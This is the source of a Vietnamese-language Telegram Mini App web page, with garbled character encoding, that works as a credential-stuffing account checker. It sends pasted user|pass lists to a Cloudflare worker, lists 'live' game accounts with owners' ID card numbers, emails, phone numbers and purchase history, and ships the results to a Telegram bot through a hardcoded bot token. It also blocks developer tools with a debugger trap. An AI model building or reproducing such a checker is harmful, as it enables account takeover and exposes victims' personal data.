<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ultima Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
    
    <script>
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode == 123) return false; // F12
            if (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) return false; // I, J, C
            if (e.ctrlKey && (e.keyCode == 85 || e.keyCode == 83)) return false; // U, S
        }
        // B·∫´y debugger ƒë∆°n gi·∫£n
        setInterval(function(){debugger;}, 200);
    </script>

    <style>
        :root { --bg: #0a0b10; --primary: #00f2ff; --text: #e0e6ed; --panel: #13151b; --danger: #ff0055; }
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; user-select: none; }

        .timer-bar {
            background: rgba(255, 0, 85, 0.1); border-bottom: 2px solid var(--danger);
            padding: 10px; text-align: center; font-family: 'Roboto Mono', monospace;
            color: var(--danger); font-weight: bold; font-size: 14px;
            animation: pulse-red 2s infinite;
        }

        .container { flex: 1; padding: 15px; display: flex; flex-direction: column; gap: 15px; overflow: hidden; }
        
        .input-box {
            background: var(--panel); border: 1px solid #333; border-radius: 10px;
            display: flex; flex-direction: column; height: 35%; padding: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        textarea {
            flex: 1; background: transparent; border: none; color: #a0aec0;
            resize: none; font-family: 'Roboto Mono', monospace; font-size: 12px;
        }
        
        .controls { display: flex; gap: 10px; }
        button {
            flex: 1; padding: 12px; border: none; border-radius: 6px;
            font-weight: 800; text-transform: uppercase; cursor: pointer;
            font-family: 'Rajdhani', sans-serif; font-size: 16px;
            color: #000; transition: 0.2s;
        }
        .btn-check { background: var(--primary); box-shadow: 0 0 10px var(--primary); }
        .btn-stop { background: #333; color: #fff; display: none; }
        .btn-export { 
            background: #00ff9d; box-shadow: 0 0 10px #00ff9d; margin-top: 10px; width: 100%; display: none;
        }

        .result-box {
            flex: 1; background: var(--panel); border: 1px solid #333; border-radius: 10px;
            padding: 10px; overflow-y: auto; font-family: 'Roboto Mono', monospace; font-size: 11px;
            display: flex; flex-direction: column; gap: 5px;
        }
        
        .res-row { 
            padding: 10px; border-radius: 4px; background: #1a1d26; 
            border-left: 3px solid #555; 
            white-space: nowrap; overflow-x: auto;
            display: flex; align-items: center; justify-content: space-between; gap: 10px;
        }
        .res-row.success { border-left-color: #00ff9d; background: rgba(0, 255, 157, 0.05); }
        .res-row.error { border-left-color: var(--danger); color: #ff88a0; }

        .res-text { flex: 1; overflow-x: auto; padding-bottom: 5px; user-select: text; }
        .res-text::-webkit-scrollbar { height: 2px; }
        .res-text::-webkit-scrollbar-thumb { background: var(--primary); }

        .copy-btn {
            background: transparent; border: 1px solid #555; color: #888;
            padding: 2px 8px; border-radius: 4px; font-size: 10px; cursor: pointer;
            flex-shrink: 0; width: auto; font-weight: normal;
        }

        @keyframes pulse-red { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div class="timer-bar" id="countdown">‚è≥ SYNC TIME...</div>

    <div class="container">
        <div class="input-box">
            <textarea id="inputList" placeholder="D√°n danh s√°ch user|pass v√†o ƒë√¢y..."></textarea>
            <div class="controls">
                <button class="btn-check" id="btnCheck" onclick="startCheck()">B·∫ÆT ƒê·∫¶U</button>
                <button class="btn-stop" id="btnStop" onclick="stopCheck()">D·ª™NG L·∫†I</button>
            </div>
            <button class="btn-export" id="btnExport" onclick="sendToBot()">üì§ G·ª¨I FILE V·ªÄ BOT</button>
        </div>

        <div class="result-box" id="resultContainer">
            <div style="color: #666; text-align: center; margin-top: 20px;">S·∫µn s√†ng...</div>
        </div>
        
        <div style="display: flex; justify-content: space-between; font-size: 12px; font-weight: bold;">
            <span style="color: #00ff9d">LIVE: <span id="countOk">0</span></span>
            <span style="color: #ff0055">DIE: <span id="countFail">0</span></span>
        </div>
    </div>

    <script>
        // --- C·∫§U H√åNH ---
        // Thay link worker c·ªßa b·∫°n v√†o ƒë√¢y
        const WORKER_URL = 'https://proud-art-e32c.qdev09.workers.dev/'; 
        
        // Token Bot l·∫•y t·ª´ file botvip.py b·∫°n g·ª≠i
        const BOT_TOKEN = '8404713686:AAF82GVIqgO_esbln3-T0R7NHPxOhwlLhbI'; 
        
        // Ng√†y 9/2/2026 (Th√°ng 2 l√† s·ªë 1)
        const DEADLINE = new Date(2026, 1, 9, 0, 0, 0).getTime(); 

        let isRunning = false;
        let stopSignal = false;
        let successList = []; 
        let stats = { ok: 0, fail: 0 };
        let tgUser = null;

        window.onload = function() {
            const tg = window.Telegram.WebApp;
            tg.expand(); 
            tgUser = tg.initDataUnsafe?.user;
            setInterval(checkTimeIntegrity, 1000);
            checkTimeIntegrity();
        };

        function checkTimeIntegrity() {
            const now = new Date().getTime();
            const distance = DEADLINE - now;
            if (distance < 0) {
                window.location.href = "baotri.html";
                return;
            }
            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            document.getElementById("countdown").innerText = `‚ö†Ô∏è SYSTEM EXPIRE IN: ${days}d ${hours}h`;
        }

        async function startCheck() {
            const textArea = document.getElementById('inputList');
            let lines = textArea.value.split('\n').filter(line => line.trim() !== "");

            if (lines.length === 0) {
                window.Telegram.WebApp.showAlert("List tr·ªëng!");
                return;
            }

            isRunning = true;
            stopSignal = false;
            successList = [];
            document.getElementById('resultContainer').innerHTML = '';
            document.getElementById('btnCheck').style.display = 'none';
            document.getElementById('btnExport').style.display = 'none';
            document.getElementById('btnStop').style.display = 'block';
            textArea.disabled = true;

            for (let i = 0; i < lines.length; i++) {
                if (stopSignal) break;
                const line = lines[i];

                // X√ìA D√íNG ƒê√É X·ª¨ L√ù
                const currentVal = textArea.value;
                const newVal = currentVal.replace(line + "\n", "").replace(line, "");
                textArea.value = newVal.trim();

                if (!line.includes('|')) continue;

                const [user, pass] = line.split('|');
                const result = await callWorker(user.trim(), pass.trim());

                if (result.status === 'success') {
                    const d = result.data;
                    
                    // --- D·ªÆ LI·ªÜU FULL 100% ---
                    const fullInfo = 
`${d.username}|${d.password}| ` +
`UID: ${d.uid || "null"} | ` +
`NAME: ${d.name || "null"} | ` +
`RANK: ${d.rank || "null"} | ` +
`LEVEL: ${d.level || "null"} | ` +
`T∆Ø·ªöNG: ${d.tuong || "null"} | ` +
`SKIN: ${d.skin || "null"} | ` +
`QH: ${d.qh || "null"} | ` +
`L·ªäCH S·ª¨ N·∫†P: ${d.lsnap || "null"} | ` +
`S√í: ${d.so || "null"} | ` +
`CCCD: ${d.cccd || "null"} | ` +
`EMAIL: ${d.email || "null"} | ` +
`AUTHEN: ${d.authen || "null"} | ` +
`SƒêT: ${d.sdt || "null"} | ` +
`FB: ${d.fb || "null"} | ` +
`BAND: ${d.band || "null"} | ` +
`NG√ÄY ƒêK: ${d.timeregacc || "null"} | ` +
`REGION: ${d.acc_country || "null"} | ` +
`LOGIN G·∫¶N NH·∫§T: ${d.lslogin || "null"} | ` +
`ƒê·ªîI MAIL: ${d.change_email || "null"} | ` +
`ƒê·ªîI SƒêT: ${d.change_sdt || "null"} | ` +
`ƒê·ªîI PASS: ${d.change_password || "null"} | ` +
`SS: ${d.ss || "null"} | ` +
`SSS: ${d.sss || "null"} | ` +
`SKIN HI·∫æM: ${d.skinlimited || "null"} | ` +
`MYSTIC: ${d.mystic || "null"} | ` +
`S-DREAMER: ${d.sdreamer || "null"} | ` +
`VALENTINE: ${d.valentine || "null"} | ` +
`OTHER: ${d.other || "null"} | ` +
`ANIME: ${d.anime || "null"} | ` +
`AOV: ${d.aov || "null"} | ` +
`HO·∫†T ƒê·ªòNG: ${d.tshoatdong || "null"} | ` +
`T√åNH TR·∫†NG: ${d.tt || "null"}`;

                    addResult(fullInfo, true);
                    successList.push(fullInfo); 
                    stats.ok++;
                } else {
                    addResult(`${user}|${pass} -> ${result.msg || 'L·ªói'}`, false);
                    stats.fail++;
                }

                document.getElementById('countOk').innerText = stats.ok;
                document.getElementById('countFail').innerText = stats.fail;
                
                await new Promise(r => setTimeout(r, 300));
            }
            stopCheck();
        }

        async function callWorker(account, password) {
            try {
                const res = await fetch(WORKER_URL, {
                    method: 'POST',
                    body: JSON.stringify({ account, password })
                });
                return await res.json();
            } catch { return { status: 'error' }; }
        }

        function stopCheck() {
            isRunning = false;
            stopSignal = true;
            document.getElementById('btnCheck').style.display = 'block';
            document.getElementById('btnStop').style.display = 'none';
            document.getElementById('inputList').disabled = false;
            
            if (successList.length > 0) {
                document.getElementById('btnExport').style.display = 'block';
                window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
            }
        }

        function addResult(text, isSuccess) {
            const container = document.getElementById('resultContainer');
            const div = document.createElement('div');
            div.className = `res-row ${isSuccess ? 'success' : 'error'}`;
            div.innerHTML = `<div class="res-text">${text}</div>`;
            container.insertBefore(div, container.firstChild);
        }

        async function sendToBot() {
            if (!tgUser) { alert("Vui l√≤ng m·ªü b·∫±ng Telegram!"); return; }
            if (successList.length === 0) return;

            const btn = document.getElementById('btnExport');
            btn.innerText = "‚è≥ ƒêANG G·ª¨I...";
            btn.disabled = true;

            const fileContent = successList.join("\n");
            const blob = new Blob([fileContent], { type: "text/plain" });
            const formData = new FormData();
            const fileName = `success_${Date.now()}.txt`;
            
            formData.append("chat_id", tgUser.id);
            formData.append("document", blob, fileName);
            formData.append("caption", `‚úÖ CHECK COMPLETED: ${successList.length} ACC LIVE`);

            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                if (res.ok) window.Telegram.WebApp.showAlert("‚úÖ ƒê√£ g·ª≠i file v·ªÅ Bot!");
                else alert("‚ùå L·ªói g·ª≠i file.");
            } catch (e) { alert("‚ùå L·ªói m·∫°ng: " + e.message); }
            
            btn.innerText = "üì§ G·ª¨I FILE V·ªÄ BOT";
            btn.disabled = false;
        }
    </script>
</body>
</html>
